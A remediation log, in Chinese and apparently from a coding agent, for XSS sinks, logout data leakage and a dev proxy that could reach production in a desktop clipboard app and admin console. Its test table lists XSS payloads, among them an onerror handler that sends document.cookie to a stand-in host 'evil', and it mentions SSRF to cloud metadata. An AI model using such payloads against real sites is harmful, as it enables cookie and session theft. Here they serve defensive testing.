# P0-B 修复记录：桌面端 Vue 前端 + 管理台（拆利用链批次）

日期：2026-09-23 · 范围：`src/desktop/src/**`、`src/desktop/package.json`、`src/admin-console/vite.config.ts`、`src/admin-console/src/**`（禁改 5 文件均未触碰）
对应审计：`08-desktop-vue-frontend.md`（S0-1 / S0-2 / S1-1）、`10-admin-console.md`（S0-2）
验证基线：后端 537 passed / 0 failed / 48 skipped —— 本批未触碰 `src/server/**`，基线不受影响。

---

## 0. 总览

| # | 项 | 状态 |
|---|----|------|
| 修复 1 | Markdown 预览存储型 XSS（S0-1） | **已修**，含同类问题地毯式排查（新发现并修复 2 处：AiNavRail 搜索片段、SpreadsheetPreview 超链接注入） |
| 修复 2 | docx 预览 XSS（S1-1） | **已修**（复用结论：报告成立） |
| 修复 3 | 登出/被踢不清本地数据 → 跨用户串号（S0-2） | **已修**（报告结论复核成立）：所有登出路径收敛到 `clearAllUserState()` + 用户 ID 命名空间防御层 |
| 修复 4 | 管理台 dev 页面可静默指向生产（S0-2 admin） | **已修**（比"横幅+确认文本"更强的方案：生产域名全路径硬拒绝）。未被任何禁改文件卡住——`api/configs.ts` 经核实与 base URL 解析无关，无需修改。红色横幅未做，理由见 §4.4（触发条件已不可达，做了就是死代码） |

---

## 1. 修复 1：Markdown 预览存储型 XSS（S0-1）

### 1.1 锚点复核（成立）

- `src/desktop/src/components/doc-preview/MarkdownPreview.vue:36`：`v-html="renderMarkdown(content)"`，而 `utils/docPreview.ts` 的 `renderMarkdown()` 直接返回 `marked.parse()` 输出，无任何消毒。
- 触发面复核成立：`.md/.markdown/.mdx/.rst` 文件预览 + 纯文本嗅探（`DocPreviewModal.detectDocType` 的 Markdown 正则判定在 `isHtmlContent` 之前，`# 标题\n<img src=x onerror=...>` 会走 Markdown 分支绕过已消毒的 HtmlPreview）。
- 内容来源：剪贴板条目/同步文件，跨设备可控。Tauri CSP `script-src 'unsafe-inline'` 不拦内联事件处理器 → 利用链成立。

### 1.2 修法

单点收敛：`utils/docPreview.ts renderMarkdown()` 的返回值统一过 `utils/html.ts sanitizeHtml()`（DOMPurify 封装，与 AiStreamText/HtmlPreview 同口径）。所有 `renderMarkdown` 调用方（MarkdownPreview 及未来新增）自动受保护。catch 分支本就手工转义，保持不变。

**marked 配置核查**（任务要求）：
- 安装版本 `marked@18.0.5`（现代 API）。`marked.setOptions({ gfm: true, breaks: false })` —— 无 `mangle`/`headerIds` 等已废弃选项（v8+ 已移除，本配置未使用）。
- 自定义 renderer 用的是新版 token 签名（`renderer.heading = ({text, depth}) => ...`），非旧版 API。
- 关键确认：现代 marked **没有**"禁止原始 HTML 直通"的选项（旧 `sanitize` 选项 v5 已删除且当年也不可靠），内嵌 HTML 恒直通 —— 所以输出侧 DOMPurify 消毒是唯一正确修法，与 marked 配置无关。
- 消毒库：**复用项目已有的 `dompurify@^3.4.12`**（`utils/html.ts` 已封装 `sanitizeHtml`），未新增消毒依赖。
- SSR 核查：桌面端是纯 Tauri WebView/Vite SPA，无 SSR 场景（无 nuxt/vite-ssr/服务端渲染入口），DOMPurify 直接可用浏览器 DOM。

**未做**：报告建议的「`detectDocType` 把 HTML 嗅探提到 Markdown 判定之前」——`renderMarkdown` 消毒后该分支已无安全意义，调换只会改变既有内容的渲染分支选择（行为变更、无安全收益），故不做。

### 1.3 消毒有效性证据（不是"加了 DOMPurify"一句话）

新增 `src/desktop/src/utils/__tests__/sanitize.test.ts`（jsdom 环境，19 用例全绿）。jsdom 是 DOMPurify 官方测试环境；生产运行环境是真实 Chromium WebView DOM，能力严格强于 jsdom。

被拦下的 payload（断言输出不含 `onerror`/`onload`/`javascript:`/`<script`/`<iframe`/`onclick`）：

| Payload | 经过路径 | 结果 |
|---|---|---|
| `<img src=x onerror=alert(1)>` | sanitizeHtml / renderMarkdown(`# Title\n<img...>`) / docx 管道 | onerror 剥离，`<img src="x">` 惰性保留 |
| `<script>alert(1)</script>` | sanitizeHtml / renderMarkdown | 整个节点删除 |
| `<a href="javascript:alert(1)">` | sanitizeHtml / renderMarkdown(`[点我](javascript:...)`) | href 清除，文本保留 |
| `<svg onload=alert(1)>` | sanitizeHtml / renderMarkdown | onload 剥离 |
| `<iframe src="javascript:...">` | sanitizeHtml | 整个节点删除 |
| `<body onload=alert(1)>` | sanitizeHtml | onload 剥离 |
| `"><img src=x onerror=alert(1)>`（属性逃逸前缀） | sanitizeHtml | onerror 剥离 |
| `<img src=x onerror="fetch('http://evil/'+document.cookie)">`（token 外传模拟） | sanitizeHtml | onerror 剥离 |
| mammoth 风格 `<p onclick=...>` + `<img onerror>` + `javascript:` 链接组合 | ensureHeadingIds→sanitizeHtml（docx 管道） | onclick/onerror/javascript: 全清除 |

无误杀回归断言（防止"消毒=把预览打坏"）：
- 标题 `id` 锚点保留（TOC 目录跳转不失效）：`renderMarkdown('## 我的标题')` 输出含 `<h2 id="...">`；
- `<strong>`/`<li>`/`https:` 链接保留；
- **mammoth 内联 `data:image/png;base64` 图片保留**（docx 图片预览不回退）；
- `renderCode`（hljs）输出复核：`<img`/`<script` 不以活标签形式出现（`<` 已转义为 `&lt;`）。

注：测试环境曾短暂装了 happy-dom，实测其 DOM 实现不完整导致 DOMPurify 行为失真（会留下 onerror 却删掉安全 h1），已卸载并改用 jsdom；该失真只影响测试环境，与生产 WebView 无关。

---

## 2. 修复 2：docx 预览 XSS（S1-1）

### 2.1 锚点复核（成立）

`DocPreviewModal.vue renderDocx()`：`mammoth.convertToHtml({ arrayBuffer })` → `ensureHeadingIds()` → `docxHtml` → `DocxPreview.vue:60` 裸 `v-html`。全链路无消毒。mammoth 不做安全过滤，.docx 来自跨设备同步/外部来源。

### 2.2 修法与核查

- `renderDocx()` 中 `ensureHeadingIds(html)` 之后、落 state 之前过 `sanitizeHtml()`；`extractHtmlToc` 改从消毒后的 HTML 抽取（id 属性 DOMPurify 保留，目录锚点不受影响，有测试断言）。
- **mammoth 选项核查**（任务要求）：调用是无选项的 `convertToHtml({ arrayBuffer })` —— 未配置 `styleMap`，未配置自定义 `convertImage`。默认 `convertImage` 把 docx 内嵌图片转成 `data:` base64 URI（非可执行内容，且消毒后保留，有测试证明不误杀）。无外部资源内联成可执行内容的路径。
- 附带影响：`sanitizeHtml` 的 FORBID_ATTR 含 `style`，docx 输出中少量内联样式会被剥掉（mammoth 默认输出语义化 HTML，基本不带内联样式；仅"空文档"占位文案失去颜色，纯观感）。

---

## 3. 全仓 HTML 注入 sink 排查表（v-html / innerHTML / dangerouslySetInnerHTML / insertAdjacentHTML / document.write）

grep 范围：`src/desktop/src/**` 与 `src/admin-console/src/**` 全量；另扫了仓库根遗留 `src/components/`（死代码目录，0 命中，且不在本批独占范围）。

**统计：桌面端 v-html 12 处 + innerHTML 1 处；管理台 0 处（无 dangerouslySetInnerHTML/innerHTML/v-html）。合计 13 处，其中内容用户可控 12 处，本批修复后 13/13 全部处于"消毒或构造期转义"状态。**

| # | 位置 | 内容来源 | 用户可控 | 处置 |
|---|------|---------|---------|------|
| 1 | desktop `components/doc-preview/MarkdownPreview.vue:36` | 剪贴板文本 / 同步 .md 文件 → `renderMarkdown` | **是**（跨设备，S0-1 主利用面） | **本批修复**：`renderMarkdown` 输出统一 `sanitizeHtml`（修在 `utils/docPreview.ts` 源头） |
| 2 | desktop `components/doc-preview/DocxPreview.vue:60` | 同步 .docx → mammoth | **是**（S1-1） | **本批修复**：`DocPreviewModal.renderDocx` 落 state 前 `sanitizeHtml` |
| 3 | desktop `components/doc-preview/SpreadsheetPreview.vue:68`（含 :34 innerHTML 读回） | 同步 .xlsx → `XLSX.utils.sheet_to_html` | **是**（本批新发现：xlsx 源码 `make_html_row` 把单元格超链接 `cell.l.Target` **未转义**拼进 `<a href="...">`，恶意表格可注入 `javascript:` href，点击即执行；单元格文本本身有 escapehtml） | **本批修复**：`ensureThead` 输出（含 catch 回退）统一 `sanitizeHtml`（DOMPurify 清 `javascript:` href；表格结构/data-*/id 属性保留） |
| 4 | desktop `components/ai/AiNavRail.vue:247` | 会话历史搜索命中片段 `hit.snippet`（服务端从会话消息正文截取；消息可回显剪贴板内容） | **是**（本批新发现：原 `highlightSnippet` 只对关键词做**正则**转义，snippet 本体**未做 HTML 转义**直通 v-html；原 eslint-disable 注释"输入已转义"表述失实） | **本批修复**：snippet 与关键词先 HTML 转义（& < > " '）再插 `<mark>` 标记；注释同步改准确 |
| 5 | desktop `components/ai/AiStreamText.vue:190` | AI 流式输出 → `sanitizeHtml(marked.parse(...))` | 是（AI 输出） | 已有消毒 ✓ 不动 |
| 6 | desktop `components/ai/AiAgentRun.vue:93` | AI agent 运行输出 → 本地 `renderMarkdown` = `sanitizeHtml(marked.parse(...))` | 是（AI 输出） | 已有消毒 ✓ 不动 |
| 7 | desktop `components/clipboard/HtmlPreview.vue:25` | Windows "HTML Format" 富文本捕获片段 / HTML 源码嗅探（剪贴板） | 是 | 已有消毒 ✓（两条路径均 `sanitizeHtml`）不动 |
| 8 | desktop `components/doc-preview/CodePreview.vue:30` | 剪贴板/文件源码 → `renderCode`（hljs.highlight） | 是 | 构造期转义（hljs 对输入 HTML 转义；catch 回退手工转义 `<`/`>`）→ 惰性。已加测试复核（§1.3）。不再叠 DOMPurify：hljs 输出的合法 `<span class>` 高亮标记会被误杀，且转义已充分 |
| 9 | desktop `components/doc-preview/PptxPreview.vue:21` | 同步 .pptx → XML `<a:t>` 文本节点提取 | 是 | 构造期转义（`DocPreviewModal.renderPptx` 对每行 `<`→`&lt;`，外层 `<p>` 为静态模板）→ 惰性 ✓ 不动 |
| 10 | desktop `components/clipboard/TemplateList.vue:42` | 同步模板内容 → `hlVars` | 是 | 构造期转义（`esc()` 先转义 & < > 再包高亮 span）✓ 不动 |
| 11 | desktop `components/clipboard/TemplatesView.vue:201` | 同上 | 是 | 同上 ✓ 不动 |
| 12 | desktop `components/clipboard/TemplateGenerateDialog.vue:201` | AI 生成模板预览 → `hlVars` | 是（AI 输出） | 同上 ✓ 不动 |
| 13 | admin-console 全部 | — | — | **0 处**：`dangerouslySetInnerHTML` / `innerHTML` / `insertAdjacentHTML` / `document.write` / `outerHTML` 全仓 grep 零命中 |

`insertAdjacentHTML` / `document.write`：两端均 0 命中。

---

## 4. 修复 3：登出/被踢不清本地数据（S0-2）

### 4.1 报告结论复核：**成立**

- `api/client.ts forceLogout()`（修复前 :158-179）只删 `clipsync-token` / `clipsync-refresh-token` / `clipsync-csrf` 三键 + 置 `config.token=null`。
- `stores/configStore.ts logout()`（修复前 :147-172）额外清了离线队列、content-cache、last-sync-at、clipboard-filter、blob URL（resetImages）、Rust 侧 clear_auth。
- forceLogout 触发点共 3 处：`api()` 401 刷新失败、`apiForm()` 401 刷新失败、`apiBlob()` 401 刷新失败——即 token 过期/被踢/管理台强制下线全部走 forceLogout，全都不清队列。
- 重放路径复核成立：下个用户登录 → HomeView `startPolling()` → `initOfflineSync()` → `flushQueue()` 用**新用户 token** `POST /api/clipboard` 逐条上传上个用户断网期间入队的条目。
- 额外复核发现报告未列全的残留：`clipsync-sync-log-v2`、`clipsync-chunked-upload`、`clipsync-device-id`（localStorage 侧）、内存态 `items`/去重 Map（copiedItems 含剪贴板**明文**）/解锁明文缓存/RBAC 用户态/设备列表缓存，正常 `logout()` 也不清（HomeView.handleLogout 只补了 notif/ann/planLimits/subscription 四样）。

### 4.2 收敛设计

新增 `utils/userDataCleanup.ts` → **`clearAllUserState()` 为唯一清理出口**：

- 主动登出：`HomeView.handleLogout()` → `configStore.logout()` → `clearAllUserState()`（handleLogout 里原先各自为政的 notif/ann/planLimits/subscription 清理已删除，收敛进统一函数；WS 摘 handler/断开与路由跳转属连接生命周期，留在 handleLogout）。
- 会话过期/被踢/401 拦截器：`client.ts forceLogout()` → `clearAllUserState()` + 复位 client 模块内 CSRF 热缓存 + 置空 configStore 的 token/user_id/device_id/user 资料 + 广播 `clipsync:auth-expired`。清理调用包 try/catch，异常时兜底手删三凭证键，保证登出永不失败。
- 切换账号 = 登出+登录，同上两条路径，无第三条私有清理。
- WS 连接：`useWebSocket` 注册了 `onUnmounted(disconnect)`，forceLogout 后路由跳 /auth、HomeView 卸载即断开，无需在清理函数里重复处理。

### 4.3 清理范围清单（⚠ 给移动端代理对齐语义用）

**每次登出（任何路径）必须清除：**

*A. 凭证*
1. access token（localStorage `clipsync-token` + 内存 store + Rust 侧 config.token）
2. refresh token（`clipsync-refresh-token`）
3. CSRF token（`clipsync-csrf` + client 模块内存热缓存）

*B. localStorage 用户数据*
4. 离线队列（**含全部用户命名空间分桶 + 匿名桶 + 旧无命名空间键**）
5. 剪贴板明文内容缓存 content-cache-v2（同上，全分桶）
6. 头像 `clipsync-avatar`
7. 墓碑同步游标 `clipsync-last-sync-at`
8. 列表筛选记忆 `clipsync-clipboard-filter`
9. 同步日志 `clipsync-sync-log-v2`
10. 收藏 `clipsync-favorites`（桌面端此键实际从未被写入——报告 B3——但防御性清除）
11. 设备 ID 缓存 `clipsync-device-id`（设备行注册在**上个账号**名下，串号会误归属上传；下次登录 `ensureDeviceId` 自动重取/重注册，无副作用）
12. 分片上传续传状态 `clipsync-chunked-upload`（属于上个用户的上传会话）
13. 用户归属标记 `clipsync-user-scope`（命名空间机制自身）

*C. 内存单例*
14. 剪贴板条目列表 items + 分页(currentPage/totalItems/mainTotalItems) + 搜索词 + 批量选择 + 分段视图 + 高级筛选 + loadError + 上传去重哈希 recentUploadHashes + skipPollUntil/initialLoadDone（`resetClipboardState()`）
15. 复制回声去重 Map ×4（copiedTexts/copiedItems/copiedFilePaths/copiedImageHashes —— copiedItems 含**剪贴板明文**，`resetCopiedMemory()`）
16. **全部图片 blob objectURL**（`releaseAllObjectUrls()` 逐个 `URL.revokeObjectURL` + 清映射；即报告 A5 的释放逻辑，现已确认三条登出路径都走到）
17. 设备列表内存缓存（`clearDevicesCache()`）
18. 收藏夹树 store（`collectionStore.reset()`：flatCollections/expandedPaths/initialized）
19. 当前用户 RBAC 态（`useUser().resetUser()`：user/loading/loaded——loaded 必须复位，否则下个登录用户 `fetchUser()` 非 force 直接命中缓存返回 null）
20. 条目解锁明文缓存（`useItemPassword().clearUnlocked()`：unlockedCache 是解密后的**明文** Map）
21. 通知列表（`useNotifications().reset()`）
22. 公告列表（`useAnnouncements().reset()`；**公告已读记忆按既有设计保留**，避免旧公告对下个用户重弹——移动端如有同类"已读记忆"需对齐这个取舍）
23. 套餐限额快照 + plan features 快照（`invalidatePlanLimits()`）
24. 当前订阅快照（`invalidateCurrentSubscription()`）
25. 功能开关（`resetFeatureFlags()`）、客户端策略（`resetPolicies()`）、菜单覆盖（`resetOverrides()`）——这三样服务端按用户下发，不清则下个用户沿用上个账号的开关/策略
26. configStore：token/user_id/device_id 置 null，user 资料(name/email/phone/plan)清空

*D. 原生侧*
27. Rust `clear_auth`（token/device_id/user_id）。**必须保留：E2E 设备私钥/密钥对**（存在 Rust 侧，clear_auth 不涉及，已核实 `src-tauri/src/lib.rs:177-186` 只清三项）、server_url、快捷键等 Rust 配置。

**明确保留（设备级偏好，经核查不含用户数据）：**
`clipsync-prefs`（主题/字号/字体/同步间隔/历史上限/自动同步/图片压缩/隐私模式/自动模糊/自启动）、后端地址 server_url、`clipsync-custom-shortcuts`、`clipsync-admin-url`、`ai-mode`/`ai-thinking-*`/`ai-*` 面板宽度与折叠态/`ai-auto-summary-on-copy`、引导类（onboarded/coach-done/first-use/survey/survey-done）、`clipsync-remember-me`、`clipsync-sec-notif`、`clipsync-announcement-reads`、`clipsync-quota-notice-*`（24h 提示节流）、`clipsync-e2e-enabled` 开关。
sessionStorage：桌面端全仓 0 使用。
AI 会话：会话/消息状态是组件实例级（非模块单例），内容持久化在服务端按 user_id 隔离；登出后路由离开 /app、组件卸载即销毁，本地无残留键（`ai-*` 键均为偏好）。移动端若把 AI 会话缓存在本地存储，则需纳入清理。

### 4.4 命名空间防御层（新）

`utils/userScope.ts`：
- 键格式 `clipsync:<userId>:offline-queue`、`clipsync:<userId>:content-cache-v2`（当前仅这两个跨用户重放危害最大的键入桶；其余用户数据键登出即删，无串号窗口）。
- 归属来源：`completeLogin(userId)` 设置；`fetchUserProfile()` 用 `/api/auth/me` 的 `data.id` 兜底设置（**覆盖 AuthPage 手工登录路径**——它不走 completeLogin）；启动时从 `clipsync-user-scope` 同步恢复，保证模块加载早期（useSyncLog 等在 import 期读存储）键就正确。
- 首登窗口期（有 token 但 userId 未解析）写 `_anon_` 桶；userId 解析后**仅 ''→uid 单向迁移**匿名桶数据进用户桶（防止该窗口入队的离线条目滞留丢失）；**A→B 绝不迁移**（防串号）。
- 清理时 `removeScopedAndLegacy(base)` 扫掉该 base 的**所有**用户桶 + 匿名桶 + 旧无命名空间键。
- **老数据处置**：命名空间化之前的旧键（`clipsync-offline-queue`/`clipsync-content-cache-v2`）无法归属到任何用户，userScope 模块加载时直接丢弃（任务授权的简单方案）。影响：升级后首次启动，上一版本残留的未同步离线条目/明文缓存一次性作废；正常升级路径下用户在线、队列多为空，实际损失≈0。
- 效果：即使未来某条新登出路径漏调清理，下个用户也只会读到自己的空桶。

---

## 5. 修复 4：管理台本地 dev 页面静默指向生产（S0-2 admin）

### 5.1 锚点复核（成立）+ 禁改文件核查

- 复核成立：`?api=https://api.clipchain.top` 链接 → `adoptUpstreamFromQuery()` 无确认落盘 + 抹掉地址栏参数 → 每请求带 `X-ClipSync-Upstream` 头 → vite proxy 按头改转发目标并把 Origin 重写为 `https://admin.clipchain.top`（生产 CORS 白名单放行）→ 本地页面可对生产下真实资金指令。dev panel 的「生产」预设一键切换同样无确认。`host:true` + `ORIGIN_ONLY` 不挡内网 → 同网段可借 header 通道打 `169.254.169.254`/内网任意主机（SSRF）。
- **禁改文件核查结果：无阻塞。** 任务提示"自然修复点可能在 `src/api/configs.ts`"——经通读，`configs.ts` 只是系统参数/开关/公告的 API 封装，与 base URL 解析**无关**。base URL 解析链在 `api/upstream.ts`（?api= 与 localStorage）、`api/client.ts`（`API_BASE='/api'` 同源 + upstreamHeaders）、`vite.config.ts`（proxy），全部在可改范围。5 个禁改文件一个都没碰（git status 里它们的 M 状态是用户/其他代理的既有改动）。

### 5.2 已实施的防护（三层）

**第 1 层 `vite.config.ts`（服务端强制，核心）：**
1. **env 目标拒绝生产**：`VITE_PROXY_TARGET` 解析为 `clipchain.top` 或其任何子域 → 配置加载即 throw，`npm run dev` 拒绝启动，错误信息给出改法。
2. **运行时 header 通道白名单**：`X-ClipSync-Upstream` 仅在同时满足以下条件时生效，否则 **403 JSON + console 告警（绝不静默回退默认 target**，防止"页面以为在操作 A 实际打到 B"）：
   - 客户端是本机（`req.socket.remoteAddress` ∈ 127.*/::1/::ffff:127.0.0.1）——同网段主机彻底失去 header 跳板；
   - 目标在白名单内：默认仅 `http://127.0.0.1:3001`、`http://localhost:3001`；可用 `VITE_PROXY_UPSTREAM_ALLOWLIST`（逗号分隔）追加联调环境；
   - 生产域名黑名单优先于白名单：即使被写进 allowlist 也剔除、也 403。内网(10./192.168./172.16-31.)、链路本地(169.254. 云元数据)、任意公网主机因不在白名单被同一机制拒绝（比"按 IP 段拉黑"更严）。
3. **Origin 重写限定白名单目标**：删除 `UPSTREAM_FRONTEND_ORIGIN` 里的生产映射（api.clipchain.top→admin.clipchain.top）；`proxyReq` 钩子对生产目标直接 return（绝不重写）；`VITE_PROXY_ORIGIN` 若是生产源同样忽略。→ 本地页面**再也拿不到生产 CORS 放行身份**。
4. `host: true` 保留（桌面端 SSO 外链需要 IPv4 环回可达，改绑定有断链风险）；其 LAN 暴露的残余风险已由第 2 条的"本机客户端限定"封堵 header 通道，剩余面只是"访问 dev UI 本身"，无 token 无法操作任何后端。

**第 2 层 `src/api/upstream.ts`（前端入口）：**
- `normalizeUpstream()` 拒绝生产域名（含子域，黑名单与 vite.config.ts 同源同注释）→ dev panel 手输/预设生产地址直接报错。
- `getUpstream()` 对**历史遗留落盘的生产地址直接作废并删除**（兼容修复前已被 `?api=` 写坏的 localStorage，防止旧值继续发头）。
- `adoptUpstreamFromQuery()` 改为**先校验后接管**：生产/非法地址 → 拒绝、**保留地址栏 `?api=` 参数**（运营者能看见这条链接想把控制台指到哪，修复了原先"事后无从察觉"）、console.warn；合法地址才抹参数+落盘+重载。

**第 3 层 `components/UpstreamDevPanel/index.tsx`（UI 诚实性）：**
- 移除「生产」预设按钮（按了也只会报错的死入口）；placeholder 从生产域名改为本地地址；hint 注明"生产域名会被拒绝"。

### 5.3 测试同步（`src/api/upstream.test.ts`，非禁改文件）

原有用例把 `?api=生产` 的静默接管当作**期望行为**钉死（3 处），与新安全语义冲突，已改为用非生产 staging 源验证原语义（落盘/抹参/重载/不重载/非法忽略），并**新增 6 条生产拒绝断言**：normalizeUpstream 拒绝生产四形态+不误伤形似域名、遗留落盘生产值作废、`?api=生产` 拒绝且保留参数不重载、未存值时 `?api=生产` 同样拒绝。全文件 14 用例通过。

### 5.4 未做的部分与诚实边界

- **红色生产横幅 + 高危操作输入确认文本：未做。** 不是被禁改文件卡住（AdminLayout.tsx/App.tsx/ConfirmReasonModal 等均可改），而是**触发条件已被消灭**：`?api=` 链接、面板手输、遗留 localStorage、env 配置、LAN header 五条通往生产的路径全部硬拒绝后，"dev 页面检测到目标是生产后端"恒为假——横幅和确认文本成为永不可达的死代码，做了恰好违反"不要为了让防护看起来做了而写实际拦不住的检查"。硬拒绝是比"横幅+确认"更强的防护（报告建议的是允许连生产但加护栏，本批任务书的指令是"明确拒绝生产域名"，按任务书执行）。
  - **如果 owner 想保留"本地连生产排障"工作流**（备选方案 B，未实施）：在 `VITE_PROXY_ALLOW_UPSTREAMS` 显式列入生产 + `UpstreamDevPanel` 输入域名确认 + AdminLayout 挂不可关闭红色横幅 + `client.ts` 拦截器对生产 upstream 的非 GET 请求要求确认文本/默认只读。需要拍板后再做。
- **对既有工作流的直接影响（需要用户动作）**：当前 `src/admin-console/.env.development.local`（gitignored，未触碰）把 `VITE_PROXY_TARGET`/`VITE_PROXY_ORIGIN` 指向生产。修复后 **`npm run dev` 会启动失败并打印明确改法**——这是"明确拒绝生产域名"的直接后果，属预期行为。需要操作生产时请改用部署版管理台；需要本地联调请把该 env 改回本地/联调地址。
- **存量合法数据的回退路径**（收紧白名单后哪类既有流程今天会被拒）：
  1. env 指向生产的 dev server → 启动即 throw，改法在错误信息里（改 env 为本地/联调地址）；
  2. localStorage 里遗留的生产 upstream（修复前被 `?api=` 写入的）→ `getUpstream()` 自动作废并删除，页面回落 vite 默认 target，无需手工清理；
  3. 桌面端 SSO 外链 `http://127.0.0.1:5273/sso?code=...&api=<生产>`（桌面 app 指向生产时点"打开管理台"）→ `?api=` 被拒（参数保留在地址栏 + console.warn），SSO 兑换会打到默认本地后端而失败。回退：开发者把桌面端服务器地址切到本地/联调再走 SSO，或直接用部署版管理台（admin 生产域）处理生产事务；
  4. 桌面端升级后旧无命名空间的离线队列/明文缓存 → 启动即丢弃（无法归属用户；正常升级时用户在线、队列基本为空，实际损失≈0，见 §4.4）。
- 边界说明：本防护只覆盖 dev proxy 这一层。生产部署版管理台（nginx 反代）本来就没有改指向入口（报告已核实 `import.meta.env.DEV` 门控 + bundle 摇树），不受影响。

---

## 6. 验证记录

| 项 | 命令 | 结果 |
|---|---|---|
| 桌面端单测 | `cd src/desktop && npx vitest run` | **4 文件 / 58 passed / 0 failed**（既有 39：useMenuAccess 17 + useSubscriptionAccess 17 + useSettingsSearch 5，全部保持绿；新增 sanitize.test.ts 19 条） |
| 桌面端类型检查 | `npx vue-tsc --noEmit`（并经 `npm run build` 二次执行） | 0 错误 |
| 桌面端构建 | `npm run build` | 成功（24.4s；chunk 大小告警为既有问题） |
| 桌面端 lint | `npx eslint <17 个改动文件>` | 0 error（仅全仓既有 CRLF prettier warning，未触碰文件同样报 1023 条，非本批引入） |
| 管理台单测 | `cd src/admin-console && npx vitest run` | **7 文件 / 95 passed / 0 failed**（含更新后的 upstream.test.ts 14 条） |
| 管理台类型检查 | `npm run typecheck`（tsc -b，含 vite.config.ts） | 0 错误 |
| 管理台构建 | `npm run build` | 成功（17.7s） |
| 管理台 lint | `npx eslint <4 个改动文件>` | 干净 |
| 管理台 E2E | 未跑 | Playwright 需起 dev server + 真后端登录 + 本机绝对路径浏览器（报告 S2-15：CI 本就不可运行，且任务禁止长占端口）；已 grep 确认 `tests/e2e/**` 不引用 upstream/`?api=`/预设，改动不波及 |
| 后端基线 | 未跑（未触碰 src/server） | 537/0/48 基线不受影响 |

消毒有效性证据见 §1.3（9 类 payload × 3 条管道全拦下 + 4 项无误杀回归断言）。

## 7. 依赖变更（src/desktop/package.json）

- **+ `jsdom`（devDependency）**：sanitize.test.ts 需要真实 DOM 才能运行 DOMPurify（`// @vitest-environment jsdom` 按文件生效，不影响其余 node 环境测试）。**消毒库本体 `dompurify@^3.4.12` 项目已有，未新增。** 管理台无任何依赖变更。

## 8. 改动文件清单

桌面端（16 改 + 3 新）：
- 改：`src/desktop/src/utils/docPreview.ts`、`src/desktop/src/utils/offlineQueue.ts`、`src/desktop/src/components/modals/DocPreviewModal.vue`、`src/desktop/src/components/ai/AiNavRail.vue`、`src/desktop/src/components/doc-preview/SpreadsheetPreview.vue`、`src/desktop/src/composables/clipboardCache.ts`、`clipboardState.ts`、`clipboardDedup.ts`、`clipboardLoad.ts`、`useSyncLog.ts`、`useUser.ts`、`src/desktop/src/stores/configStore.ts`、`src/desktop/src/api/client.ts`、`src/desktop/src/views/HomeView.vue`、`src/desktop/package.json`、`package-lock.json`
- 新：`src/desktop/src/utils/userScope.ts`、`src/desktop/src/utils/userDataCleanup.ts`、`src/desktop/src/utils/__tests__/sanitize.test.ts`

管理台（4 改）：
- `src/admin-console/vite.config.ts`、`src/api/upstream.ts`、`src/api/upstream.test.ts`、`src/components/UpstreamDevPanel/index.tsx`

禁改清单核对：`src/desktop/index.html`、`src/desktop/src-tauri/**`、`src/admin-console/src/api/configs.ts`、`src/mocks/data.ts`、`src/mocks/handlers.ts`、`src/mocks/handlers.test.ts`、`src/pages/settings/index.tsx` —— **全部未触碰**（git status 中它们的改动是用户/并行代理的既有工作）。

## 9. 顺带发现但未改（不在本批范围）

1. `eslint.config.js` 全局关闭 `vue/no-v-html`（报告 08 提及的防线失效之一）——该文件在 `src/desktop/` 根，不在本批独占范围（仅 src/**+package.json），建议后续批次恢复规则并对 §3 表中 12 处逐个加豁免注释，形成"新增 v-html 必须过审"的机器防线。
2. CSP `script-src 'unsafe-inline'`（`src-tauri/tauri.conf.json`，禁改+另一代理范围）：消毒落地后 XSS 主通道已关，但 CSP 收紧仍值得排期（owner 已有"CSP 排期"待决项）。
3. `detectDocType` 嗅探顺序（Markdown 在 HTML 前）未调换——消毒后无安全影响，调换属行为变更（见 §1.2）。
4. AuthPage 三条登录路径仍绕开 `completeLogin`（丢设备注册，报告 S1-2）——未修（超范围）；但 `fetchUserProfile` 现在会兜底补 `config.user_id` 与用户命名空间，S1-2 的"串号"半边已被命名空间防御层缓解，"设备误归属"半边仍在。
5. sanitizeHtml 全局禁 `style` 属性：docx/富文本预览的少量内联样式会被剥掉（纯观感、安全优先）；若日后要保留样式，应改用 DOMPurify 的 CSS 白名单方案而非直接放行 style。
6. 报告 B3 死键 `clipsync-favorites`（只读不写）已纳入登出清理，键本身仍在 ClipboardView 被读取——死代码清理留待 S3 批次。
